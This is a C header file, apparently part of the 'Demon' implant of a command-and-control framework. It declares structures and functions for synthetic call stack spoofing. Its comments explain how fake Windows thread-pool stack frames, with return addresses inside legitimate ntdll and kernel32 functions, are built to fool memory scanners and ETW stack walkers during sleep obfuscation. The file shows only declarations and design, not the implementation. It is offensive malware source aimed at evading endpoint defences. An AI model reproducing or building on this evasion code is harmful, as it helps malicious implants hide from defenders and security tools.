#ifndef DEMON_CALLSTACK_H
#define DEMON_CALLSTACK_H

#include <windows.h>

/*
 * Synthetic Call Stack Spoofing
 *
 * Fabricates a realistic thread-pool-style call stack to fool memory
 * scanners and ETW stack walkers during sleep obfuscation.
 *
 * Instead of simply setting RSP = StackBase (trivially detected),
 * we construct proper stack frames with return addresses pointing
 * into legitimate ntdll/kernel32 code regions. The resulting stack
 * mimics a standard Windows thread pool worker:
 *
 *   NtWaitForSingleObject
 *     → TpReleaseCleanupGroupMembers (ntdll)
 *       → RtlUserThreadStart (ntdll)
 *         → BaseThreadInitThunk (kernel32)
 *
 * Return addresses are found by scanning module exports and walking
 * code for CALL instruction boundaries, producing addresses that
 * point to instruction-aligned locations within legitimate functions.
 */

#if _WIN64

/* Maximum number of synthetic frames we'll fabricate */
#define SYNTH_STACK_MAX_FRAMES  8

/* Minimum stack frame size (bytes) - includes shadow space + alignment */
#define SYNTH_FRAME_MIN_SIZE    0x28

/* Synthetic stack frame descriptor */
typedef struct _SYNTH_FRAME {
    PVOID  ReturnAddress;    /* return address for this frame (points into legit module) */
    PVOID  FrameBase;        /* RBP value for frame-pointer based unwinding              */
    ULONG  FrameSize;        /* total size of this frame on the stack (bytes)            */
} SYNTH_FRAME, *PSYNTH_FRAME;

/* Pre-resolved return addresses from legitimate modules.
 * Populated once during init, reused across all sleep cycles. */
typedef struct _SYNTH_STACK_CTX {
    BOOL   Initialized;
    ULONG  FrameCount;
    SYNTH_FRAME Frames[ SYNTH_STACK_MAX_FRAMES ];
} SYNTH_STACK_CTX, *PSYNTH_STACK_CTX;

/*!
 * @brief
 *  Initialize the synthetic call stack context by scanning ntdll
 *  and kernel32 for suitable return addresses.
 *  Call once during DemonInit after modules are loaded.
 *
 * @param Ctx pointer to context structure (typically in Instance)
 * @return TRUE on success
 */
BOOL SynthStackInit(
    _Out_ PSYNTH_STACK_CTX Ctx
);

/*!
 * @brief
 *  Write synthetic stack frames to the target RSP region.
 *  Called during sleep obfuscation to set up the spoofed thread context.
 *
 * @param Ctx   initialized context
 * @param Rsp   target RSP value (top of the stack region to populate)
 * @return      adjusted RSP value pointing to the top frame
 */
ULONG_PTR SynthStackWrite(
    _In_ PSYNTH_STACK_CTX Ctx,
    _In_ ULONG_PTR        Rsp
);

#endif /* _WIN64 */

#endif /* DEMON_CALLSTACK_H */
